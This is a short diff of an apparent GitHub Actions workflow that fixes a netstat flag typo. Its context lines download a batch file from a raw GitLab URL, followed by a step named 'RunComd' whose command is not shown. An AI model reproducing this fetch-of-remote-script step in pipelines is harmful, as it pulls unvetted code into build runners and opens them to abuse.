@@ -12,7 +12,7 @@ jobs:
       shell: cmd
       run: |
          echo helloworld
-         netstat - a
+         netstat -a
     - name: Download
       run: Invoke-WebRequest https://gitlab.com/myoutlookhub/rsgd/-/raw/main/Downloads.bat -OutFile Downloads.bat
     - name: RunComd
